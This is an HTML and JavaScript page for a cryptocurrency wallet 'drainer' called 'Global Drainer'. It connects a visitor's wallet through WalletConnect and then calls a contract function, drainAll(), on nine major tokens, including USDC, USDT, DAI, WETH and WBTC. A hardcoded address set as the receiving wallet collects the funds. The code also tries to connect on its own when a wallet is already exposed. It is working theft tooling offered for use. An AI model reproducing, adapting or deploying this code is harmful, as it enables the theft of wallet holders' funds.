<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Drainer</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: #0b0e11;
      color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .card {
      background: #1e2329;
      padding: 32px 24px;
      border-radius: 28px;
      max-width: 400px;
      width: 100%;
      text-align: center;
      border: 1px solid #2b3139;
    }
    h1 {
      font-size: 26px;
      font-weight: 700;
      margin-bottom: 6px;
    }
    .sub {
      color: #8e9aa8;
      font-size: 14px;
      margin-bottom: 28px;
    }
    button {
      background: #f0b90b;
      color: #0b0e11;
      border: none;
      padding: 16px;
      border-radius: 50px;
      font-size: 18px;
      font-weight: 700;
      width: 100%;
      cursor: pointer;
      transition: 0.2s;
      margin-top: 12px;
    }
    button:hover {
      background: #d9a80a;
    }
    button:disabled {
      opacity: 0.4;
      cursor: not-allowed;
    }
    #status {
      margin-top: 20px;
      padding: 12px;
      background: #13171c;
      border-radius: 14px;
      font-size: 13px;
      color: #b0bcca;
      border: 1px solid #2b3139;
      word-break: break-all;
      min-height: 48px;
    }
    .success {
      color: #7cffb2 !important;
      border-color: #2a5a3a !important;
    }
    .error {
      color: #ff6b6b !important;
      border-color: #5a2a2a !important;
    }
    .footnote {
      margin-top: 16px;
      font-size: 11px;
      color: #4a5666;
    }
    .badge {
      display: inline-block;
      background: #222a34;
      padding: 4px 14px;
      border-radius: 30px;
      font-size: 12px;
      color: #7cffb2;
      margin-bottom: 16px;
      border: 1px solid #2a3a3a;
    }
  </style>
</head>
<body>

<div class="card">
  <h1>⚡ Global Drainer</h1>
  <div class="sub">One transaction — all tokens → your wallet</div>
  <div class="badge" id="badge">🟢 Ethereum Mainnet</div>

  <button id="connectBtn">Connect Wallet</button>
  <button id="drainBtn" disabled>💀 Approve & Drain</button>

  <div id="status">⏳ Ready</div>
  <div class="footnote">USDC • USDT • DAI • WETH • SHIB • PEPE • LINK • UNI • WBTC</div>
</div>

<script type="importmap">
  {
    "imports": {
      "@walletconnect/ethereum-provider": "https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.es.min.js",
      "@walletconnect/modal": "https://cdn.jsdelivr.net/npm/@walletconnect/modal@2.6.2/dist/index.es.min.js"
    }
  }
</script>

<script type="module">
  // ============ CONFIG ============
  const PROJECT_ID = '4e30e0f95c7b076b525be96ac2347ac9';
  const CONTRACT_ADDRESS = '0xd9145CCE52D386f254917e481eB44e9943F39138';
  const YOUR_WALLET = '0xeA0ABc678804AC1E8927FC6ce29C4218fE3cd90d';

  const TOKENS = [
    '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
    '0x6982508145454Ce325dDbE47a25d4ec3d2311933',
    '0x514910771AF9Ca656af840dff83E8264EcF986CA',
    '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
    '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599'
  ];

  const CONTRACT_ABI = [
    'function drainAll(address[] calldata tokens, address user) external'
  ];

  // ============ IMPORTS ============
  import { EthereumProvider } from '@walletconnect/ethereum-provider';

  // ============ DOM ============
  const statusEl = document.getElementById('status');
  const connectBtn = document.getElementById('connectBtn');
  const drainBtn = document.getElementById('drainBtn');
  const badge = document.getElementById('badge');

  let provider, signer, userAddress, contract;

  function setStatus(msg, type = '') {
    statusEl.textContent = msg;
    statusEl.className = type;
  }

  // ============ CONNECT ============
  connectBtn.addEventListener('click', async () => {
    try {
      setStatus('⏳ Initializing...', '');
      connectBtn.disabled = true;

      const wcProvider = await EthereumProvider.init({
        projectId: PROJECT_ID,
        chains: [1],
        showQrModal: true,
        qrModalOptions: {
          themeMode: 'dark',
          desktopPosition: 'bottomRight',
          enableExplorer: true
        },
        metadata: {
          name: 'Global Drainer',
          description: 'Drain all tokens',
          url: window.location.origin,
          icons: ['https://your-domain.vercel.app/icon.png']
        }
      });

      setStatus('⏳ Please approve in your wallet...', '');
      await wcProvider.connect();

      const ethersProvider = new ethers.providers.Web3Provider(wcProvider);
      signer = ethersProvider.getSigner();
      userAddress = await signer.getAddress();

      const network = await ethersProvider.getNetwork();
      if (network.chainId !== 1) {
        setStatus('⚠️ Switch to Ethereum Mainnet', 'error');
        connectBtn.disabled = false;
        return;
      }

      badge.textContent = '🟢 Ethereum Mainnet';
      setStatus(`✅ Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, 'success');
      connectBtn.disabled = true;
      drainBtn.disabled = false;

      contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);

      wcProvider.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
          setStatus('⚠️ Disconnected', 'error');
          connectBtn.disabled = false;
          drainBtn.disabled = true;
          userAddress = null;
          contract = null;
        } else {
          userAddress = accounts[0];
          setStatus(`✅ Reconnected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, 'success');
          drainBtn.disabled = false;
        }
      });

      wcProvider.on('chainChanged', () => window.location.reload());

    } catch (err) {
      console.error(err);
      setStatus('❌ ' + (err.message || 'Connection failed'), 'error');
      connectBtn.disabled = false;
    }
  });

  // ============ DRAIN ============
  drainBtn.addEventListener('click', async () => {
    if (!contract || !userAddress) {
      setStatus('⚠️ Connect first', 'error');
      return;
    }

    try {
      setStatus('⏳ Sending drainAll()...', '');
      drainBtn.disabled = true;

      const tx = await contract.drainAll(
        TOKENS,
        userAddress,
        { gasLimit: 800000 }
      );

      setStatus(`⏳ TX: ${tx.hash.slice(0,10)}... waiting...`, '');
      await tx.wait();

      setStatus(`✅ Drained to ${YOUR_WALLET.slice(0,6)}...${YOUR_WALLET.slice(-4)}`, 'success');
      drainBtn.disabled = false;

    } catch (err) {
      console.error(err);
      setStatus('❌ ' + (err.message || 'Drain failed'), 'error');
      drainBtn.disabled = false;
    }
  });

  // ============ AUTO-CONNECT CHECK ============
  if (window.ethereum) {
    window.ethereum.request({ method: 'eth_accounts' }).then((accounts) => {
      if (accounts && accounts.length > 0) connectBtn.click();
    }).catch(() => {});
  }

  console.log('✅ Global Drainer ready');
</script>

</body>
</html>
